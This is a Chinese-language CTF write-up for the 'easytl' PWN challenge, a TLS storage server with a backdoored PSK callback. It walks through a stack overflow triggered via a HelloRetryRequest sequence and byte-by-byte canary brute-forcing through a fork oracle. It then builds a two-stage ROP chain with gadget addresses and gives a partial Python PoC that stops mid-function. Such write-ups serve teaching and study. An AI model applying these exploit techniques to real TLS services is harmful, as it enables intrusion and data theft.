# easytl（2026强网杯）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 附件题（无靶机环境） |
| 附件 | easytl.zip（含easytl、server.crt、server.key） |
| 目标 | 无（离线附件） |

Flag：flag{动态容器已脱敏}

题目提示只有一句“一个正常的服务器，快来试试吧。”，实际是一个静态链接OpenSSL的TLS“加密存储”服务。

## 2. 题目分析

- `easytl`：ELF64、**静态链接**（静态OpenSSL 3.x + glibc），`ET_EXEC`非PIE，NX开、栈保护开（函数级`fs:0x28`）。
- 附带`server.crt`/`server.key`，服务自己bind `0.0.0.0:1443`，`accept`后fork（实际三重fork）+`alarm(80)`，然后`SSL_new/SSL_set_fd/SSL_accept`，握手成功后跑一个6命令的“加密存储”分发器。

静态链接这件事对利用影响很大，值得先记下来：

- 二进制里已经打包了OpenSSL 3.x与glibc的全部代码，`.text`段极大，**gadget极其充裕**，不必去libc里找`pop rdi; ret`；
- 同时意味着**没有libc基址问题**：`ET_EXEC`且非PIE，所有函数、gadget、`.bss`都是固定地址，ROP链里可以直接写绝对地址，不需要任何泄漏；
- 但也意味着**没有现成的`system("/bin/sh")`可蹭**（静态glibc里`system`依赖`__libc_start_main`初始化过的环境），所以链子老老实实走`syscall`。

进程与fd模型也要记住，后面两段ROP完全依赖它：

```text
父进程: socket() -> bind(0.0.0.0:1443) -> listen() -> accept() 循环
子进程: fork 若干次后 close(listen_fd)，只剩 conn_fd
        conn_fd = 3 被 close 后空出，4 = SSL 用的 socket
```

`SSL_set_fd(ssl, fd)`用的fd就是`4`（0/1/2是stdin/stdout/stderr，3是被关掉的监听socket），所以ROP里`read(4, ...)`、`write(4, ...)`直接对socket收发；而`open()`返回的第一个可用fd正好是**3**，于是`read(3, buf, n)`读文件内容成立。这个“fd 3空着”的细节是第二段ROP能一条链读完flag的前提。

### TLS层（关键）

`SSL_CTX`初始化（0x4032bb）注册了三样东西：

| 注册函数 | 回调 | 作用 |
| --- | --- | --- |
| `SSL_CTX_set_ciphersuites(ctx,"TLS_AES_256_GCM_SHA384")` | — | 只留TLS1.3套件 |
| `SSL_CTX_set_info_callback(ctx, 0x4030d5)` | info_cb | 握手loop事件/收alert事件 |
| `SSL_CTX_set_psk_find_session_callback(ctx, 0x402dbb)` | psk_find_cb | 外部PSK查找（后门） |
| servername回调0x40320a | sni_cb | `SSL_get_servername`→`calloc(strlen+0x10)`+copy |

全局：

```text
0x970f40 psk_buf     0x970f48 psk_len(=0x20)     # 由 psk_find_cb 写入
0x970f50 sni_buf     0x970f58 sni_len            # 由 sni_cb 写入
0x970f60 cur_ptr     0x970f68 cur_len            # 由 info_cb 的 loop 事件写入
```

**漏洞函数0x40304d（info_cb在收alert时调用）：**

```c
char buf[0x50];                    // rbp-0x60
memset(buf, 0, 0x50);
memcpy(buf, cur_ptr, cur_len);     // 长度与指针来自两套互不相干的全局
fprintf(stdout, "%s error\n", buf); // 泄漏只到容器 stdout，拿不到
/* 下面还有 canary 校验 */
```

漏洞点是**长度/数据源错配**：

- info_cb的**loop事件（mask 0x2002）**把`cur_len`设成`sni_len`（覆盖`psk_len`），`cur_ptr`设成当时存在的缓冲区；
- 之后的**alert事件（mask 0x4004）**只要`psk_buf != NULL && psk_len == 0x20`就调用0x40304d，此时`cur_ptr = psk_buf`而`cur_len`仍是**sni_len**；
- 结果：`memcpy(stack[0x50], psk_identity_buf, sni_len)`——**数据源是攻击者完全控制的PSK identity，长度是攻击者控制的SNI长度**。

后门PSK identity = `1401518dc5d7641ccd41593a5d812410`（32字节），命中后还会用硬编码EC key造一个`SSL_SESSION`（binder校验必然失败，所以握手下不去——正好在失败处触发alert）。

### PSK identity，它能当payload

TLS1.3的`pre_shared_key`扩展（type 0x0029）长这样：

```text
struct {
    PskIdentity identities<7..2^16-1>;    // 每个: opaque identity<1..2^16-1> + uint32 ticket_age
    PskBinderEntry binders<33..2^16-1>;   // 每个: opaque binder<32..255>
} OfferedPsks;
```

`identity`是**长度前缀的不透明字节串**，协议层完全不检查内容，OpenSSL只是把`(ptr, len)`原样交给`psk_find_session_callback`。于是它天然是一个**可以装任意字节（包括`\x00`、`\xff`、换行）的攻击者缓冲区**，且最大长度65535——比SNI的255字节宽松得多。本题后门逻辑是：

```c
/* 0x402dbb, psk_find_cb */
if (identity_len >= 0x20 && !memcmp(identity, "1401518d...", 0x20))
    build_session_from_hardcoded_ec_key(...);   // 写入 psk_buf/psk_len
```

命中后服务器会用硬编码EC私钥临时造一个`SSL_SESSION`并返回给引擎；而客户端提供的binder（HMAC，48字节）当然是伪造的，**binder校验必然失败**，`SSL_accept`随即报错并发出alert。这正是要的：回调已经把`psk_buf`填好，而失败又在同一次握手里制造了alert事件。

顺带解释`identity`与`strlen`的坑：这份payload里**允许出现`\x00`**，因为身份比较走的是长度+`memcmp`；只有“第33字节必须为0”这条是为了让随后的字符串式处理截断在32字节。构造payload时按`identity = 后门串(32) + \x00 + 任意数据`拼，长度多少就填多少。

### 绕canary：逐字节爆破（fork型服务经典手法）

canary在源码偏移**0x58**（缓冲区0x50 + 8字节填充）。
把`sni_len`设成`0x58 + k`就只覆盖canary的前k字节，**剩下字节保持原值**⇒猜对即校验通过。

0x40304d的栈帧（偏移以`buf`首字节为0，即`buf`位于`rbp-0x60`）：

```text
buf 起点        +0x00   ← memcpy 目的地址，数据来自 identity[0]
                +0x50   buf[0x50] 结束
填充            +0x50 ~ +0x57
canary          +0x58   fs:0x28        ← 8字节，实际是 00 xx xx xx xx xx xx xx
saved rbp       +0x60
返回地址        +0x68   ← 溢出链起点
```

因为`memcpy`从`buf`开头顺序写，`sni_len`写到哪儿，哪儿的旧值就被覆盖，**超过`sni_len`的部分原封不动**。所以长度取`0x58+k`时：

- `buf`到canary前k字节被写满；
- canary的第k+1~8字节仍然是进程里的真值；
- 校验函数逐字节比，只要前k字节猜对，整8字节就相等，函数正常返回。

canary最低字节恒为`0x00`（glibc终止符设计），爆破时直接跳过第一个字节，从第2字节开始256选1；剩下的字节约`255×7≈1800`次连接即可。

**为什么能一直猜**：服务在`accept`后`fork`，canary是进程启动时从`AT_RANDOM`取的，fork只是复制页表，**所有子进程canary完全相同**；每个连接崩溃只死一个子进程，父进程继续`accept`。因此可以几十线程并发打，互不影响。

**Oracle（不回显任何东西也能判）**：0x40304d返回后info_cb会`write(fd,"error",5)`裸写socket；

- 猜对→收到alert记录之后多出裸`error`；
- 猜错→canary失败abort，alert之后什么都没有。

判定实现上就一条规则：把socket读到超时/EOF，**看整段数据是否以`error`结尾**。`write`是裸写，不套TLS记录头，所以它一定出现在所有TLS记录之后，位置稳定；猜错时`__stack_chk_fail`直接`abort`，连这5字节都发不出来，连接被内核关闭。两种结果没有歧义，不需要任何回显或时间侧信道。

爆破时长度与内容要联动：第k字节阶段把`sni_len`定为`0x58+k`，identity总长也取这个值（SNI长度必须等于identity长度，`make_sni`按需切成若干≤63字符的label拼成合法域名），并把已恢复的前k-1字节和新候选字节写到`identity[0x58 : 0x58+k]`。注意`identity[0:32]`永远是后门串、`identity[32]`永远是`\x00`，这两个约束不能被payload挤掉，否则`psk_find_cb`不命中，连溢出都不会发生。

于是7~8字节×256次即可拿全，且每个连接都是fork出来的新进程、canary不变，可多线程并发。实测远端~40秒拿全：

```text
CANARY = 006afe94cd3ec0e5
```

### 两段ROP

SNI上限255字节⇒溢出链只有`255-0x68 = 151`字节，装不下open/read/write。用**stack pivot**分两段：

算一下为什么一段不够：SNI是`uint16`长度但DNS名字段被OpenSSL限制在255，所以`memcpy`最多写255字节；`buf`到返回地址要吃掉`0x68`，剩下`151`字节≈18个qword。而一个`open+read+write`三连、每个系统调用都要`pop rdi/rsi/rdx/rax + syscall`，光寄存器装载就`4×2+1=9`个qword=72字节，三连216字节——**超出65字节**，而且path字符串还没地方放。所以必须把“长链”搬到别处。

pivot的做法是：第一段链只做两件事——用`read`把第二段从socket读进`.bss`，然后`pop rsp; ret`把栈顶换到`.bss`。细节上，0x40304d正常返回时执行的是`leave; ret`（`mov rsp,rbp; pop rbp; ret`），`ret`弹出的第一个qword就是`+0x68`处的`pop rdi; ret`，链条由此开始；`+0x60`那8字节（saved rbp）在`leave`时被弹进`rbp`，已经无关紧要，填垃圾即可（用`0xdeadbeefdeadbeef`便于在调试器里认出边界）。

**Stage 1（栈上，11个qword，88字节）**

```text
read(4, BSS, 0x400)      # 从 socket 拉 stage2
pop rsp ; ret -> BSS     # 栈迁移到 .bss
```

**Stage 2（.bss里，长度不限）**

```text
open(path, O_RDONLY)     # path 字符串也放在 blob 里
read(3, buf, 0x100)      # 子进程 close(listen) 后 3 号 fd 空着
write(4, buf, 0x100)     # 直接把 flag 甩回 socket
```

两段的衔接时序必须对齐，否则`read`读不到东西：

1. 客户端发CH2后**立刻**发stage2的`0x400`字节blob——此时服务端还在处理CH2，数据先排在socket缓冲里，不会丢；
2. 服务端`memcpy`溢出、`leave; ret`进stage1，第一条`read(4, BSS, 0x400)`把缓冲里的blob读进`.bss`，返回值为`0x400`；
3. `ret`到`pop rsp; ret`，`rsp = 0x979000`，随即从`.bss`第一条qword开始执行stage2；
4. stage2跑完`exit(0)`，进程退出，客户端读到的就是flag。

`.bss`里的布局（相对`BSS=0x979000`；指令链与path字符串必须落在`read`的`0x400`窗口内，flag缓冲区只是`read`的目标地址，可以越出窗口）：

```text
BSS+0x000  stage2 指令链（4个系统调用，约0x120字节）
BSS+0x300  path 字符串 "flag\0"        ← open 的 rdi 指向这里
BSS+0x500  flag 读入缓冲区             ← 可以超出 0x400，只是目标地址
```

stage2每条指令都用`pop rdi/rsi/rdx/rax; syscall`逐条搭，`rsi`默认0、`rdx`默认0，`open`只需要路径就够（`O_RDONLY`就是0）。`open`返回的fd一定是**3**：子进程早已`close(listen_fd)`，0/1/2被占用、4是连接socket，3是编号最小的空闲项，于是`read(3, ...)`正好读文件；`write(4, ...)`则直接回socket。这条“3号fd空着”的推断是整个stage2不需要任何`getsockopt`/`dup2`的原因。

**为什么最后读的是相对路径`flag`**：分发器的工作目录就是题目部署目录，`flag`文件被放在进程CWD下，没有`/flag`、`/flag.txt`。绝对路径`open`会`ENOENT`（返回负值，`read`随即失败，客户端只会拿到空数据），而相对路径由内核按`CWD`解析，一次命中。路径字符串是stage2 blob的一部分，想换目标只需改`BSS+0x300`处的字节，不涉及任何重定位。

用到的gadget（均已capstone复核）：

| 用途 | 地址 |
| --- | --- |
| pop rax ; ret | 0x5f6c9a |
| pop rdi ; ret | 0x4251bd |
| pop rsi ; ret | 0x5e9a79 |
| pop rdx ; ret | 0x52f0d2 |
| syscall ; ret | 0x76e706 |
| pop rsp ; ret | 0x4b9b60 |

注意：identity是长度前缀的二进制字段，**payload里可以有`\x00`**；只需保证`strlen(identity)==32`（第33字节写0）且前32字节等于后门identity。

完整payload与栈偏移是同一张表（`identity[i]`正好落在`buf+i`，因为`memcpy`从`identity[0]`开始抄）：

```text
identity[0x00:0x20]  后门PSK identity（32字节）
identity[0x20]       \x00
identity[0x21:0x58]  填充（A）
identity[0x58:0x60]  canary（爆破所得）
identity[0x60:0x68]  saved rbp 垃圾
identity[0x68:0xC0]  stage1（11个qword）
identity[0xC0:0xFF]  剩余填充
```

因此**SNI长度必须恰好等于identity长度**（两者都是255），否则`cur_len`与payload对不齐，canary那8字节就会错位。`0x68+0x58=0xC0`，距255还余63字节，stage1放得下是这套方案成立的前提；超了就只能再借一层pivot，没必要。

所有gadget都在静态`.text`里、地址小于`0x800000`，`ET_EXEC`无PIE，直接8字节小端写入即可，不需要任何基址泄漏或ret2dlresolve之类的补救。

## 3. 解题过程

`cur_len`必须先被loop事件写成SNI长度，再让`psk_buf`出现。一个ClientHello里做不到（PSK解析失败早于loop事件）。

先把info_cb的两个分支看清楚（`where`是OpenSSL传入的状态掩码）：

| mask | 含义 | 触发时机 | 副作用 |
| --- | --- | --- | --- |
| `0x2002` | `SSL_CB_ACCEPT_LOOP`（服务端握手循环推进一格） | 每处理完一段握手消息 | `cur_ptr`/`cur_len`刷新为当前缓冲区与`sni_len` |
| `0x4004` | `SSL_CB_READ_ALERT`（收到对端alert） | 握手失败/对端告警 | 若`psk_buf && psk_len==0x20`则调0x40304d |

**SNI长度先被记录、PSK缓冲区后出现**这个顺序是硬性的：`sni_cb`在解析ClientHello扩展时就跑了，loop事件在那次`SSL_accept`推进后立即写入`cur_len`；而`psk_find_cb`只有在解析到`pre_shared_key`时才会跑。把两者塞进同一个CH，PSK回调发生在loop事件之前，`cur_len`还没来得及变成`sni_len`（此时是老值0），溢出长度就是0。

解法：**用HRR让服务器处理两次ClientHello**，把“写长度”和“填psk_buf”拆到两个不同的CH里。

1. **CH1**：`supported_groups=[0x1234(假), x25519]`与`key_share=[0x1234]`，并带超长SNI→服务器回**HelloRetryRequest**（要求x25519）。CH1处理成功⇒loop事件触发⇒`cur_len = sni_len`。
2. **CH2**：`key_share=[x25519]`，并带后门identity的`pre_shared_key`（binder随便填）→psk_find_cb写入`psk_buf`→binder校验失败→发alert→进入0x40304d⇒溢出。

几个必须遵守的协议细节，错一个就前功尽弃：

- **CH1的SNI长度就是最终的溢出长度**。`cur_len`是从CH1抄下来的，CH2里的SNI只用于通过一致性检查，不重新决定长度；因此两次的SNI必须**逐字节相同**（同长度同内容），否则服务端按`illegal_parameter`直接终止，压根走不到溢出。
- **CH1不能带`pre_shared_key`**，否则PSK回调提前执行，顺序又乱了。
- **CH2必须复用CH1的`session_id`**（32字节随机数），TLS1.3把session_id当作HRR的“握手指纹”，不匹配即拒绝。
- `key_share`里给`0x1234`一个32字节的假公钥即可：CH1的`key_share`只有未知组`0x1234`，服务端找不到可用的共享，就从`supported_groups`里挑一个双方都支持、自己又有密钥的组（x25519）下发HRR要求重发；这一步不涉及任何密钥校验，必定成功——这正是能“白跑一遍握手循环”的原因。
- HRR本身是`ServerHello`（record type 0x16，handshake type 0x02），其random是固定魔数`CF21AD74...`；客户端代码只需读到这条记录就发CH2，不需要真去算密钥。

握手状态机走到CH2时的情况是：`cur_len`已被CH1的loop事件固定为`sni_len`，`psk_buf`刚被回调填好且`psk_len==0x20`，紧接着binder校验失败。三者同时成立，alert分支的条件才满足，0x40304d被调用，`memcpy`拿着“PSK identity的指针+ SNI的长度”开抄——**源可控、长度可控的栈溢出**就此成立。

握手过程日志：

```text
1401518dc5d7641ccd41593a5d812410 error
*** stack smashing detected ***: terminated
```

## 4. PoC

```python
import concurrent.futures as cf, os, socket, struct, sys

PSK = b'1401518dc5d7641ccd41593a5d812410'
POP_RAX, POP_RDI, POP_RSI, POP_RDX, POP_RSP, SYSCALL = 0x5f6c9a, 0x4251bd, 0x5e9a79, 0x52f0d2, 0x4b9b60, 0x76e706
BSS, FLAG = 0x979000, 0x979500
p16 = lambda x: struct.pack('>H', x)
p64 = lambda x: struct.pack('<Q', x)
ext = lambda t, d: p16(t) + p16(len(d)) + d

def make_sni(n):
    out = b''
    while n > 63:
        out += b'a' * 63 + b'.'; n -= 64
    return out + b'a' * n

def ch(sid, sni, idn=None, group=0x1234):
    e = [ext(0x0000, p16(len(sni) + 3) + b'\x00' + p16(len(sni)) + sni),
         ext(0x000a, p16(4) + p16(0x1234) + p16(0x001d)),
         ext(0x000d, p16(4) + p16(0x0804) + p16(0x0403)),
         ext(0x002b, b'\x02\x03\x04'),
         ext(0x0033, p16(36) + p16(group) + p16(32) + os.urandom(32)),
         ext(0x002d, b'\x01\x01')]
    if idn:
        ent, bid = p16(len(idn)) + idn + b'\x00' * 4, os.urandom(48)
        e.append(ext(0x0029, p16(len(ent)) + ent + p16(len(bid) + 2) + p16(len(bid)) + bid))
    body = p16(0x0303) + os.urandom(32) + b' ' + sid + p16(2) + p16(0x1302) + b'\x01\x00' + p16(sum(map(len, e))) + b''.join(e)
    return b'\x16\x03\x01' + p16(len(body) + 4) + b'\x01' + len(body).to_bytes(3, 'big') + body

def fire(h, p, idn, to=4.0):
    s = socket.create_connection((h, p), timeout=to); sid = os.urandom(32)
    sni = make_sni(len(idn))
    s.sendall(ch(sid, sni)); hdr = s.recv(5)
    n = struct.unpack('>H', hdr[3:5])[0]
    while n > 0: n -= len(s.recv(n))
    s.sendall(ch(sid, sni, idn, 0x001d)); return s

def oracle(h, p, ln, guess):
    idn = bytearray(b'A' * (ln - 33)); idn[0x58 - 33:0x58 - 33 + len(guess)] = guess
    try:
        s = fire(h, p, PSK + b'\x00' + bytes(idn), 3.0); s.settimeout(0.8); d = b''
        while True:
            try: c = s.recv(65535)
            except socket.timeout: break
            if not c: break
            d += c
```
